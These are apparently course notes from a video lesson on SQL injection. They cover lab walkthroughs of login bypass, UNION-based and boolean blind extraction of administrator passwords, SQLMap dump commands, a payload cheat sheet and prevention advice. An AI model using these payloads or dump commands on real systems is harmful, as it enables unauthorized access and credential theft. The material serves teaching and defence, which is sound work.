# Cybersecurity Course : SQL Injection (SQLi) — Theory, Types, Payloads, SQLMap & Prevention

## https://youtu.be/yIuokZDWQl4

> Platform: PortSwigger Web Academy labs used for all practicals
> Topics covered: Database & SQL fundamentals, what is SQL Injection, authentication bypass, types of SQLi (In-Band / Blind / Out-of-Band), Error-Based & Union-Based attacks, Blind SQLi (boolean-based & timing-based), SQLMap automation tool, prevention techniques, ethical/legal boundaries.

> ⚠️ **Ethical Disclaimer (from instructor):** Everything practised in this course is performed only on authorized labs (PortSwigger, DVWA, TryHackMe, HackTheBox). Testing any real website without explicit written permission is **illegal** — even if you report the vulnerability afterward. This course is strictly for learning defensive and ethical security skills.

---

## Table of Contents

1. [What is a Database?](#1-what-is-a-database)
2. [What is SQL?](#2-what-is-sql)
3. [Basic SQL Queries](#3-basic-sql-queries)
4. [Normal SQL Login Flow](#4-normal-sql-login-flow)
5. [What is SQL Injection?](#5-what-is-sql-injection)
6. [Why SQL Injection Matters — Impact](#6-why-sql-injection-matters--impact)
7. [How SQL Injection Works — Query Manipulation](#7-how-sql-injection-works--query-manipulation)
8. [Where to Test for SQL Injection](#8-where-to-test-for-sql-injection)
9. [How to Detect SQL Injection Vulnerability](#9-how-to-detect-sql-injection-vulnerability)
10. [Types of SQL Injection](#10-types-of-sql-injection)
    - [10.1 In-Band SQL Injection](#101-in-band-sql-injection)
    - [10.2 Blind SQL Injection](#102-blind-sql-injection)
    - [10.3 Out-of-Band SQL Injection](#103-out-of-band-sql-injection)
11. [In-Band SQLi Sub-Types](#11-in-band-sqli-sub-types)
    - [11.1 Error-Based SQLi](#111-error-based-sqli)
    - [11.2 Union-Based SQLi](#112-union-based-sqli)
12. [Practical 1 — Authentication Bypass (Login Bypass)](#12-practical-1--authentication-bypass-login-bypass)
13. [Practical 2 — Union-Based SQLi (Extracting Usernames & Passwords)](#13-practical-2--union-based-sqli-extracting-usernames--passwords)
14. [Practical 3 — Blind SQLi (Boolean-Based)](#14-practical-3--blind-sqli-boolean-based)
15. [SQLMap — Automated SQL Injection Tool](#15-sqlmap--automated-sql-injection-tool)
16. [Common SQL Injection Payloads — Cheat Sheet](#16-common-sql-injection-payloads--cheat-sheet)
17. [What Data Can Be Stolen via SQLi](#17-what-data-can-be-stolen-via-sqli)
18. [SQLi Prevention (Developer's Perspective)](#18-sqli-prevention-developers-perspective)
19. [Beginner Mistakes to Avoid](#19-beginner-mistakes-to-avoid)
20. [Legal Practice Environments](#20-legal-practice-environments)
21. [Key Takeaways / Summary](#21-key-takeaways--summary)
22. [Glossary](#22-glossary)

---

## 1. What is a Database?

**Definition:** A database is where a website stores all of its data.

**How it works:**

- When you open a website in a browser, your request goes to the website's **server**.
- Inside the server is a **database** that contains the website's data.
- The server queries the database and returns the relevant data back to your browser as a response (e.g., a web page, product list, user profile).

**Structure of a Database:**

```
DATABASE
│
├── Table: users
│   ├── Column: id
│   ├── Column: username
│   └── Column: password
│
├── Table: students
│   ├── Column: name
│   ├── Column: email
│   └── Column: contact
│
└── Table: mentors
    ├── Column: name
    └── Column: email
```

> **Simple analogy:** A database is like an **Excel file with multiple sheets** — each sheet is a "table," each column header is a "column," and each row is a record of data.

**How login works using a database:**

- When you **sign up** on a website, your credentials (username, password) are stored in the database.
- When you **log in**, the website queries the database with your entered credentials.
- If they match the stored data → you are allowed in. If not → access is denied.

---

## 2. What is SQL?

**Full form:** SQL = Structured Query Language

**Definition:** SQL is the language used to **communicate with and query a database**.

> **SQL is a language used to ask questions of a database.**

Every time you log in or search on a website, an SQL query runs **behind the scenes** — sending your input to the database and retrieving the relevant response.

- SQL runs in the background — users never see it directly.
- Attackers exploit this same language to manipulate the database for unauthorized access.

---

## 3. Basic SQL Queries

Understanding these basic SQL commands is essential before learning SQL injection.

### SELECT — Retrieve Data

```sql
SELECT * FROM users;
```

- `SELECT` — tells the database to retrieve data.
- `*` — means **all** (select all columns/fields).
- `FROM users` — specifies the **table name** (`users` in this case).
- **Result:** Returns all data from the `users` table.

### SELECT with WHERE — Filter by Condition

```sql
SELECT * FROM users WHERE username = 'alice';
```

- `WHERE` — introduces a **condition** (like an "if" statement).
- `username = 'alice'` — the condition: only return rows where the username column equals "alice".
- **Result:** Returns all columns of the row(s) where username is 'alice'.

### Key Concepts

| Keyword  | Meaning                                                   |
| -------- | --------------------------------------------------------- |
| `SELECT` | Retrieve/fetch data                                       |
| `*`      | All columns (wildcard)                                    |
| `FROM`   | Specify the table name                                    |
| `WHERE`  | Add a condition to filter results                         |
| `AND`    | Both conditions must be true                              |
| `OR`     | At least one condition must be true                       |
| `--`     | Comment — everything after this is ignored (not executed) |
| `UNION`  | Combine results of two SELECT queries                     |

---

## 4. Normal SQL Login Flow

When you log in to a website, this is what happens in the background:

**The query generated:**

```sql
SELECT * FROM users WHERE username = 'alice' AND password = 'password123';
```

**Logic:**

- `username = 'alice'` → True ✓
- `AND password = 'password123'` → True ✓
- `True AND True` = **True** → Login allowed ✓

**If password is wrong:**

- `username = 'alice'` → True ✓
- `AND password = 'wrongpassword'` → False ✗
- `True AND False` = **False** → Login denied ✗

**Key insight:** The two fields you fill in on a login form (username and password) are inserted directly into this SQL query. This is the entry point for SQL injection.

---

## 5. What is SQL Injection?

**Definition:** SQL Injection means **tricking the database into doing something it should not** — by injecting malicious SQL code into an input field that gets incorporated into a backend query.

> **Restaurant analogy (from instructor):** Imagine you go to a restaurant and the waiter takes your order. Instead of writing a normal food order, you write "Give me everything for free." And the chef follows your instruction. That's SQL Injection — inserting unexpected instructions that the system (chef/database) shouldn't follow, but does because there's no validation.

**How it happens:**

1. You fill in a login form (or search bar, URL parameter, etc.) with **malicious SQL code** instead of normal input.
2. The website takes your input and inserts it **directly into the SQL query** without any checking or sanitization.
3. The now-modified query is sent to the database.
4. The database executes it — including your injected malicious code.
5. You get unauthorized access, stolen data, or cause damage.

---

## 6. Why SQL Injection Matters — Impact

SQL Injection is listed in **OWASP's Top 10 Most Critical Web Vulnerabilities** and remains one of the most commonly exploited attacks as of 2026.

**What an attacker can do with SQL Injection:**

| Attack                     | Description                                                                                   |
| -------------------------- | --------------------------------------------------------------------------------------------- |
| **Authentication Bypass**  | Log in to any account (including admin) without knowing the password.                         |
| **Data Theft**             | Extract usernames, emails, passwords, phone numbers, and financial data.                      |
| **Destroy / Modify Data**  | Delete an entire database or modify records — causing catastrophic damage to an organization. |
| **Information Disclosure** | Reveal database structure (table names, column names, software versions).                     |

**Real-world scale:** Millions of user records (usernames, passwords, credit card data) have been exposed through a single vulnerable input field. All an attacker needs is a **browser** — no special tools required for basic SQLi.

---

## 7. How SQL Injection Works — Query Manipulation

### Method 1: Comment-Out the Password Check (when username is known)

**Normal query:**

```sql
SELECT * FROM users WHERE username = 'alice' AND password = 'mypassword';
```

**Attacker enters in the username field:**

```
alice'--
```

**Resulting query:**

```sql
SELECT * FROM users WHERE username = 'alice'--' AND password = 'anything';
```

**What happened:**

- `alice` → the known username.
- `'` → a single quote that **closes the opening quote** in the original query.
- `--` → a **SQL comment**. Everything after `--` is ignored by the database.
- The password check (`AND password = ...`) is now **commented out** — it never executes.
- The database only checks the username → it's valid → login succeeds.

> **The `--` comment trick:** In SQL, `--` marks the start of a comment (similar to `#` in Python). Anything after `--` on the same line is treated as a comment and not executed. By injecting `--`, the attacker causes the rest of the query (including the password condition) to be ignored.

### Method 2: OR with a Universal True Condition (when username is unknown)

**Attacker enters in the username field:**

```
admin' OR 1=1--
```

**Resulting query:**

```sql
SELECT * FROM users WHERE username = 'admin' OR 1=1--' AND password = '...';
```

**What happened:**

- `username = 'admin'` → possibly False (admin may not exist) ✗
- `OR 1=1` → **always True** ✓ (1 always equals 1 — universal truth)
- `False OR True` = **True** ✓
- `--` → comments out the rest (password check ignored).
- Overall result: True → Login succeeds.

> **The `OR 1=1` trick:** By using `OR` with a condition that is **always true** (`1=1`), the entire WHERE clause evaluates to True regardless of whether the username or password is correct.

---

## 8. Where to Test for SQL Injection

SQL Injection can be tested on any page where user input interacts with a database query:

| Location                        | Why It's Vulnerable                                                                                        |
| ------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| **Login page**                  | Username and password fields are inserted into authentication queries.                                     |
| **Search bar**                  | Search terms are inserted into SELECT queries.                                                             |
| **URL parameters**              | Values like `?id=1` in URLs are directly used in queries. `https://target.com/product?id=1` → try `?id=1'` |
| **Sign-up / registration form** | Name, email, phone fields inserted into INSERT queries.                                                    |
| **Profile/account pages**       | User-controlled profile fields inserted into UPDATE queries.                                               |

---

## 9. How to Detect SQL Injection Vulnerability

### The Single Quote Test

Add a **single quote (`'`)** to any input field or URL parameter and observe the page behavior:

| Response                                                             | Interpretation                                                                          |
| -------------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
| **SQL error message** (e.g., "You have an error in your SQL syntax") | Page is **vulnerable** — the error confirms the input is being used in a raw SQL query. |
| **Blank/broken page**                                                | Possibly vulnerable — the malformed query caused an unexpected result.                  |
| **Page loads differently** (content changed, items missing/added)    | Possibly vulnerable — the single quote disrupted the query logic.                       |
| **Page loads exactly as normal**                                     | Likely **protected** — the input is being sanitized/parameterized.                      |

> **Core principle:** Any change in the page behavior after injecting a single quote is a clue that SQL injection may exist on that page.

---

## 10. Types of SQL Injection

### 10.1 In-Band SQL Injection

**Definition:** SQL injection where the **response/output is visible on the web page itself** — errors, data, or behavioral changes are directly shown.

- The most common and easiest to exploit.
- You can see the results of your injection directly on the web page.
- Sub-types: **Error-Based** and **Union-Based** (covered in Section 11).

### 10.2 Blind SQL Injection

**Definition:** SQL injection where **no visible output or error** is returned — but you can infer whether the injection worked based on the **behavior** of the web page.

**Two methods of detection:**

- **Boolean-based:** The page shows different content depending on whether your condition is True or False (e.g., a "Welcome back" message appears only when the condition is true).
- **Time-based:** The page **takes longer to respond** if a specific condition is true (e.g., you inject a sleep command — if the page delays by 5+ seconds, the condition is true).

### 10.3 Out-of-Band SQL Injection

**Definition:** SQL injection where the **extracted data is sent to the attacker's own server** — not returned through the web page response.

- The attacker injects a query that causes the database to make an outbound connection to a server the attacker controls.
- Any user accessing the vulnerable web page sends their data to the attacker's server.
- Less common, requires specific database features to be enabled.

---

## 11. In-Band SQLi Sub-Types

### 11.1 Error-Based SQLi

**How it works:**

- Inject a single quote or malformed SQL into a parameter.
- The server returns an **SQL error message** (e.g., `You have an error in your SQL syntax near...`).
- This error **confirms the vulnerability** and may even reveal database structure information.

**Detection method:**

- Add `'` to a URL parameter: `https://target.com/product?id=1'`
- If you get an SQL error → the page is Error-Based SQLi vulnerable.

### 11.2 Union-Based SQLi

**Definition:** Uses the SQL `UNION` operator to **attach a second (malicious) SELECT query** to the original query — combining both results and displaying the extracted data on the web page.

**How UNION works:**

- `UNION` combines the results of two SELECT statements.
- **Requirement:** Both SELECT statements must have the **same number of columns**.

**Attack flow:**

1. Determine how many columns the original query returns.
2. Find which column(s) can display text (string data type).
3. Inject a UNION SELECT query to extract data from any table.

**Step 1 — Find number of columns (using NULL):**

```sql
' UNION SELECT NULL--           -- Try 1 column → error means wrong
' UNION SELECT NULL,NULL--      -- Try 2 columns → 200 OK means 2 columns exist
' UNION SELECT NULL,NULL,NULL-- -- Try 3 columns → error means not 3
```

**Step 2 — Find text-compatible column:**

```sql
' UNION SELECT NULL,'abc'--     -- 'abc' in column 2 → if 200 OK, column 2 accepts text
' UNION SELECT 'abc',NULL--     -- 'abc' in column 1 → if error, column 1 doesn't accept text
```

**Step 3 — Extract data (when table/column names are known):**

```sql
' UNION SELECT NULL,username||'~'||password FROM users--
```

- `username||'~'||password` → **string concatenation** (joining username + separator + password in one column).
- `||` is the concatenation operator (Oracle/PostgreSQL).
- `FROM users` → the table to query.

**ORDER BY method (alternative for column counting):**

```sql
' ORDER BY 1--   -- No error
' ORDER BY 2--   -- No error
' ORDER BY 3--   -- Error! → Only 2 columns exist
```

---

## 12. Practical 1 — Authentication Bypass (Login Bypass)

**Platform:** PortSwigger Web Academy — "SQL Injection vulnerability in login function"
**Goal:** Log in as the `administrator` user without knowing the password.

### Steps

1. Navigate to the login page of the lab.
2. In the **Username** field, enter:
   ```
   administrator'--
   ```
3. In the **Password** field, enter anything (e.g., `randompassword`).
4. Click Login.

### What Happens

The query sent to the database becomes:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'randompassword';
```

- `'administrator'` — closes the username string.
- `--` — comments out everything after (the password condition is ignored).
- The database only checks: does a user with username `administrator` exist? → Yes.
- Login succeeds without knowing the password.

**Result:** Lab solved — logged in as administrator.

### Alternative Payload (when username is unknown)

```
' OR 1=1--
```

This logs you in as the **first user** in the database (often the admin account since it's typically the first created).

---

## 13. Practical 2 — Union-Based SQLi (Extracting Usernames & Passwords)

**Platform:** PortSwigger Web Academy — "SQL Injection UNION attack, retrieving multiple values in a single column"
**Goal:** Extract all usernames and passwords from the `users` table; log in as administrator.

**Given information (from lab description):**

- Table name: `users`
- Column names: `username`, `password`
- Target user: `administrator`

### Steps in Burp Suite Repeater

**Step 1 — Intercept a request:**

- In the lab, click any product category (e.g., "Lifestyle").
- In Burp Suite, intercept the request → send to Repeater.
- The vulnerable parameter is the URL's `filter?category=Lifestyle` GET parameter.

**Step 2 — Confirm vulnerability:**

```
Lifestyle'
```

→ Add a single quote after the category value → Response: **500 Internal Server Error** → Vulnerable ✓

**Step 3 — Determine number of columns:**

```
Lifestyle' UNION SELECT NULL--
```

→ Error (1 column doesn't work)

```
Lifestyle' UNION SELECT NULL,NULL--
```

→ **200 OK** → 2 columns exist ✓

**Step 4 — Find which column accepts text:**

```
Lifestyle' UNION SELECT 'abc',NULL--
```

→ Error → Column 1 does NOT accept text ✗

```
Lifestyle' UNION SELECT NULL,'abc'--
```

→ **200 OK** → Column 2 accepts text ✓

**Step 5 — Extract usernames and passwords (concatenated in column 2):**

```
Lifestyle' UNION SELECT NULL,username||'~'||password FROM users--
```

→ **200 OK** → The response now contains username~password pairs for all users.

**Step 6 — Read the results:**

- In the Render tab, search for `administrator`.
- Find: `administrator~[password]`
- Note down the password.

**Step 7 — Log in:**

- Go to "My Account" → enter `administrator` + the extracted password → Login.
- **Result:** Lab solved — logged in as administrator.

---

## 14. Practical 3 — Blind SQLi (Boolean-Based)

**Platform:** PortSwigger Web Academy — "Blind SQL Injection with conditional responses"
**Goal:** Extract the `administrator` user's password character by character, then log in.

**Key behavior of this lab:**

- A **"Welcome back"** message appears on the page when your injected condition is **True**.
- The message disappears when your condition is **False**.
- There are no SQL errors and no data displayed directly — purely behavior-based.

**Vulnerable parameter:** The `TrackingId` cookie (not a URL parameter — this is the common beginner mistake).

### Steps

**Step 1 — Intercept in Burp Suite:**

- Click any product category → Burp Suite intercepts the request.
- Send to Repeater.
- Modify the `TrackingId` cookie value (not the URL).

**Step 2 — Confirm vulnerability using the cookie:**

Append to the TrackingId value:

```
' AND 1=1--
```

→ "Welcome back" appears → True condition ✓

```
' AND 1=2--
```

→ "Welcome back" disappears → False condition ✓

This confirms the cookie is vulnerable to Boolean-based Blind SQLi.

**Step 3 — Confirm the `users` table exists:**

```
' AND (SELECT 'a' FROM users LIMIT 1)='a'--
```

→ "Welcome back" appears → `users` table exists ✓

**Step 4 — Confirm `administrator` user exists:**

```
' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
```

→ "Welcome back" appears → `administrator` user exists ✓

**Step 5 — Find the password length:**

```
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--
```

→ True (password > 1 character) ✓

Increment the number until the condition becomes False:

```
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>10)='a'--   → True
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>15)='a'--   → True
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a'--   → False
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a'--   → True ✓
```

**Password length confirmed: 20 characters.**

**Step 6 — Extract password character by character (using SUBSTRING):**

The `SUBSTRING(password, position, length)` function extracts a specific character from the password:

```
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

- `password` → the column to extract from.
- `1` → start position (character 1 = first character).
- `1` → length of substring (1 character at a time).
- `='a'` → compare the extracted character with 'a'.

If "Welcome back" appears → the first character is 'a'. If not, try 'b', 'c', etc.

**Automate with Burp Intruder:**

1. Send the request to **Intruder**.
2. Mark the **character position** (the `1` in `SUBSTRING(password,1,1)`) as one payload position.
3. Mark the **comparison character** (`'a'`) as a second payload position.
4. Attack type: **Cluster Bomb** (tests all combinations).
5. Payload 1 (positions): Numbers 1–20.
6. Payload 2 (characters): Brute Forcer with:
   - Character set: `a-z` and `0-9` (alphanumeric — lab description confirms password is alphanumeric).
   - Min/Max length: 1.
7. Start attack.
8. Sort results by **Response Length** — requests with a different length indicate the correct character (the "Welcome back" message makes the response longer when the condition is True).

**Step 7 — Assemble the password:**

- Note down each character found per position (1–20).
- Combine them into the full 20-character password.

**Step 8 — Log in:**

- Go to "My Account" → enter `administrator` + the extracted password.
- **Result:** Lab solved — logged in as administrator.

---

## 15. SQLMap — Automated SQL Injection Tool

**What is SQLMap?**
A **free, open-source automated tool** that performs SQL injection testing — automating in seconds what we did manually above.

**Key features:**

- Detects whether a URL/parameter is vulnerable to SQLi.
- Identifies the database type (MySQL, MSSQL, Oracle, PostgreSQL, SQLite, etc.).
- Lists all databases, tables, and columns.
- Dumps (extracts) all data from specified tables.
- Pre-installed in **Kali Linux**.

> **Important principle:** Always **manually verify** the vulnerability exists first, then use SQLMap to automate further data extraction. Running SQLMap blindly without manual confirmation wastes time and may cause unnecessary noise on the target.

### SQLMap Commands

**Check if installed / get version:**

```bash
sqlmap --version
```

**Basic vulnerability scan:**

```bash
sqlmap -u "https://target.com/page?id=1"
```

- `-u` → specify the URL.
- Must include the **GET parameter** in the URL (e.g., `?id=1`).
- SQLMap only works with **GET parameters** visible in the URL.

**List all databases:**

```bash
sqlmap -u "https://target.com/page?id=1" --dbs
```

- `--dbs` → enumerate (list) all available databases.

**List tables in a specific database:**

```bash
sqlmap -u "https://target.com/page?id=1" -D database_name --tables
```

- `-D database_name` → specify the target database.
- `--tables` → list all tables within it.

**Dump data from a specific table:**

```bash
sqlmap -u "https://target.com/page?id=1" -D database_name -T users -C username,password --dump
```

- `-T users` → specify the target table (`users`).
- `-C username,password` → specify which columns to extract.
- `--dump` → extract and display all data from those columns.

**Download SQLMap from GitHub (if not pre-installed):**

```bash
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py --version
python3 sqlmap.py -u "URL"
```

### SQLMap Workflow

```
1. Find a URL with a GET parameter    →  https://target.com/page?id=1
2. Manually test with '              →  Confirm vulnerability exists
3. sqlmap -u "URL" --dbs             →  Get list of databases
4. sqlmap -u "URL" -D [db] --tables  →  Get tables in target database
5. sqlmap -u "URL" -D [db] -T [table] -C username,password --dump
                                     →  Extract the data
```

---

## 16. Common SQL Injection Payloads — Cheat Sheet

### Testing for Vulnerability

```
'
''
`
')
"))
```

### Authentication Bypass (Login Bypass)

```
' OR 1=1--
' OR 1=1#
' OR '1'='1
admin'--
administrator'--
' OR 'x'='x
```

### URL Parameter Testing

```
1'
1 OR 1=1
1' ORDER BY 1--
1' ORDER BY 2--
1' UNION SELECT NULL--
```

### Comment Syntax (by Database)

| Database                         | Comment Syntax |
| -------------------------------- | -------------- |
| **MySQL**                        | `--` or `#`    |
| **MSSQL (Microsoft SQL Server)** | `--`           |
| **Oracle**                       | `--`           |
| **SQLite**                       | `--`           |
| **PostgreSQL**                   | `--`           |

### String Concatenation (for UNION attacks — by Database)

| Database       | Concatenation Syntax                           |
| -------------- | ---------------------------------------------- |
| **Oracle**     | `'foo'\|\|'bar'`                               |
| **Microsoft**  | `'foo'+'bar'`                                  |
| **PostgreSQL** | `'foo'\|\|'bar'`                               |
| **MySQL**      | `'foo' 'bar'` (space) or `CONCAT('foo','bar')` |

### UNION-Based Payloads

```sql
-- Find column count:
' ORDER BY 1--
' ORDER BY 2--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

-- Extract data (2 columns, text in column 2):
' UNION SELECT NULL,username||'~'||password FROM users--
```

### Blind SQLi (Boolean-Based)

```sql
-- True condition (page loads normally):
' AND 1=1--

-- False condition (page behaves differently):
' AND 1=2--

-- Check if table exists:
' AND (SELECT 'a' FROM users LIMIT 1)='a'--

-- Check password length:
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>10)='a'--

-- Extract character by character:
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

---

## 17. What Data Can Be Stolen via SQLi

Once an attacker has SQL injection access to a database, they can potentially steal:

| Data Category          | Examples                                                              |
| ---------------------- | --------------------------------------------------------------------- |
| **User credentials**   | Usernames, passwords (hashed or plain), email addresses               |
| **Personal data**      | Phone numbers, home addresses, date of birth                          |
| **Financial data**     | Credit card numbers, bank account details, transaction history        |
| **Session data**       | Login tokens, session cookies (can be used to hijack sessions)        |
| **Database structure** | Table names, column names, database engine version, software versions |

### On Password Hashing

Most modern databases store passwords as **hashes** rather than plain text:

- A hash is a fixed-length cryptographic representation of a password (e.g., `5f4dcc3b5aa765d61d8327deb882cf99` for "password").
- Hashing is a **one-way process** — you can't directly reverse a hash to get the original password.
- **However:** Common passwords have well-known, pre-computed hashes. If you use a weak/common password (e.g., `admin123`, `password`), attackers can match your hash against databases of known password hashes (called **Rainbow Tables**).
- **Defense:** Use strong, unique passwords. Unique passwords → unique hashes → much harder to crack. Many organizations also use **salted hashes** (hashes with a random value added before hashing) to further protect against rainbow table attacks.

---

## 18. SQLi Prevention (Developer's Perspective)

An ethical hacker understands both attack and defense. Here are the key defenses against SQL injection:

### 1. Parameterized Queries / Prepared Statements (Most Effective)

**The root cause of SQLi:** User input is directly concatenated into the SQL query string.

**The fix:** Use **parameterized queries** (also called prepared statements) — where the SQL code and user input are kept **completely separate**.

```python
# UNSAFE (vulnerable):
query = "SELECT * FROM users WHERE username = '" + username + "'"

# SAFE (parameterized):
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))
```

With parameterized queries, the database **never interprets user input as SQL code** — it's always treated as literal data.

### 2. Input Validation

- Restrict what characters are allowed in each input field.
- For usernames: only allow letters, numbers, underscores — **reject special characters** like `'`, `"`, `-`, `;`.
- If single quotes are never accepted as input, the `'` injection technique cannot work.

### 3. Principle of Least Privilege

- The database user account used by the web application should have **only the minimum permissions necessary**.
- If the app only needs to read data, don't give it write/delete/drop permissions.
- This limits damage if an injection attack does succeed.

### 4. Hide / Suppress Error Messages

- **Never** display raw SQL error messages to end users — they reveal database structure information.
- Show generic error messages (e.g., "An error occurred") instead.
- Log the detailed errors server-side for developers to review.

### 5. Web Application Firewall (WAF)

- A WAF sits in front of the web application and **filters malicious traffic** — blocking known SQLi patterns before they reach the application.
- Examples: AWS WAF, Cloudflare WAF, ModSecurity.
- **Important:** A WAF is a supplementary control — it should **not replace** proper parameterized queries and secure coding practices. Use both together.

---

## 19. Beginner Mistakes to Avoid

| Mistake                                         | Why It's Wrong                                                                                                                   | What to Do Instead                                                                              |
| ----------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------- |
| **Testing on real websites without permission** | This is **fully illegal** — even if you don't break anything or report it afterward.                                             | Only practice on authorized labs (PortSwigger, DVWA, TryHackMe, HackTheBox).                    |
| **Giving up after one payload fails**           | Different databases use different syntax — one payload may not work but another will.                                            | Try multiple payloads from a cheat sheet before concluding the page is safe.                    |
| **Ignoring small page changes**                 | Blind SQLi is detected through tiny behavioral differences (e.g., a "Welcome back" message appearing/disappearing).              | Observe every change carefully — even a minor difference is a significant clue.                 |
| **Forgetting to URL-encode payloads**           | Unencoded special characters in URLs may be rejected before reaching the server.                                                 | In Burp Suite Repeater, select your payload and press `Ctrl+U` to URL-encode it.                |
| **Only testing the login form**                 | SQLi can exist in search bars, URL parameters, sign-up forms, profile fields, and anywhere user input interacts with a database. | Test all input points systematically.                                                           |
| **Running SQLMap before manual testing**        | SQLMap is for automation after confirming a vulnerability manually. Blindly running it is noisy and often ineffective.           | Always manually confirm the vulnerability exists first, then use SQLMap to automate extraction. |

---

## 20. Legal Practice Environments

### Free Authorized Labs (No Permission Needed)

| Platform                           | URL                            | What You Can Practice                            |
| ---------------------------------- | ------------------------------ | ------------------------------------------------ |
| **PortSwigger Web Academy**        | `portswigger.net/web-security` | SQLi, XSS, CSRF, SSRF, and more — guided labs    |
| **DVWA (Damn Vulnerable Web App)** | Installed locally              | SQLi, brute force, XSS — full range of web vulns |
| **TryHackMe**                      | `tryhackme.com`                | Guided rooms, CTF-style challenges               |
| **HackTheBox**                     | `hackthebox.com`               | More advanced, realistic machines                |

### For Real-World Practice (Authorization Required)

- **Bug Bounty Programs** (e.g., HackerOne, Bugcrowd) — companies officially invite security researchers to test their systems. This provides **legal authorization** to test real websites and get paid for valid vulnerabilities.

### What Is Illegal

- Testing **any real website without explicit, written permission** from the owner — even if you find nothing, even if you report it. This is a criminal offense in most jurisdictions.
- Storing, selling, or using any data obtained via SQLi.

---

## 21. Key Takeaways / Summary

1. **Databases** store all website data in **tables** containing **columns** of data. SQL is the language used to query and interact with databases.
2. **SQL Injection** occurs when malicious SQL code is injected into an input field that is incorporated unsanitized into a backend SQL query — tricking the database into doing unauthorized things.
3. **Authentication bypass** is achievable by closing the query string early with a single quote (`'`) and commenting out the password check with `--`.
4. **Three types of SQLi:** In-Band (results visible on page), Blind (inferred from behavior), Out-of-Band (data sent to attacker's server).
5. **In-Band subtypes:** Error-Based (errors reveal info) and **Union-Based** (attaches a second query to extract data from other tables).
6. **Union-Based attack process:** Count columns (using NULL/ORDER BY) → find text-compatible column → inject UNION SELECT with target table data.
7. **Blind SQLi** has no visible output — you infer true/false conditions from page behavior changes (e.g., presence/absence of a "Welcome back" message) and extract data character by character using `SUBSTRING`.
8. **SQLMap** automates the entire SQLi process — but always manually confirm the vulnerability exists first.
9. **Prevention:** Parameterized queries are the most effective defense. Supplement with input validation, least privilege, error suppression, and WAF.
10. **Ethics & legality:** Only test on authorized labs or with explicit permission. Unauthorized testing is illegal regardless of intent.

---

## 22. Glossary

| Term                                | Definition                                                                                                                   |
| ----------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| **SQL (Structured Query Language)** | The language used to communicate with and query relational databases.                                                        |
| **Database**                        | A structured storage system for website data — organized into tables, columns, and rows.                                     |
| **Table**                           | A structured data store within a database, similar to a spreadsheet sheet.                                                   |
| **Column**                          | A named field/category within a table (e.g., username, password, email).                                                     |
| **SELECT**                          | SQL command to retrieve data from a database.                                                                                |
| **WHERE**                           | SQL clause that adds a filter condition to a query.                                                                          |
| **UNION**                           | SQL operator that combines the results of two SELECT statements.                                                             |
| **`--`**                            | SQL comment syntax — causes everything after it on the same line to be ignored.                                              |
| **SQL Injection (SQLi)**            | An attack where malicious SQL code is injected into input fields to manipulate backend database queries.                     |
| **Authentication Bypass**           | Logging in to an account without knowing the valid credentials, using SQLi to skip the password check.                       |
| **In-Band SQLi**                    | SQLi where the injected results are visible directly on the web page response.                                               |
| **Error-Based SQLi**                | In-Band SQLi that uses database error messages to confirm and exploit the vulnerability.                                     |
| **Union-Based SQLi**                | In-Band SQLi that uses the UNION operator to attach a malicious query and extract data from other tables.                    |
| **Blind SQLi**                      | SQLi where no visible output is returned — vulnerability is inferred from page behavior (True/False responses).              |
| **Boolean-Based Blind SQLi**        | Blind SQLi using True/False conditions to extract data bit by bit (e.g., "Welcome back" message appears only on True).       |
| **Time-Based Blind SQLi**           | Blind SQLi using database sleep/delay commands to infer True/False (True = page delays 5+ seconds).                          |
| **Out-of-Band SQLi**                | SQLi where extracted data is sent to the attacker's external server rather than the web page response.                       |
| **SUBSTRING()**                     | SQL function that extracts a portion of a string — used in Blind SQLi to extract one character at a time.                    |
| **Payload**                         | The specific SQL code/string injected by the attacker to exploit the vulnerability.                                          |
| **GET Parameter**                   | A value passed in a URL after `?` (e.g., `?id=1`) — often vulnerable to SQLi and required for SQLMap.                        |
| **Parameterized Query**             | A secure SQL coding technique that separates SQL code from user input — prevents SQLi entirely.                              |
| **WAF (Web Application Firewall)**  | A security layer that filters and blocks malicious web traffic — provides additional protection against SQLi.                |
| **SQLMap**                          | A free, open-source automated SQL injection tool — pre-installed in Kali Linux.                                              |
| **Burp Suite**                      | A web security testing platform — used to intercept, inspect, and modify web traffic.                                        |
| **Burp Repeater**                   | Burp Suite component for manually resending and modifying intercepted requests.                                              |
| **Burp Intruder**                   | Burp Suite component for automating payload injection across multiple positions — used for brute-force character extraction. |
| **Hash**                            | A one-way cryptographic transformation of a password — stored instead of plain text for security.                            |
| **Rainbow Table**                   | A precomputed table of hash values for common passwords — used by attackers to crack hashed passwords.                       |
| **OWASP Top 10**                    | A standard awareness document for web application security risks — SQLi is consistently listed.                              |
| **Bug Bounty**                      | A program where organizations invite security researchers to legally find and report vulnerabilities for rewards.            |
| **DVWA**                            | Damn Vulnerable Web Application — an intentionally insecure web app used for security practice.                              |

---

_End of Part 10 transcription notes._
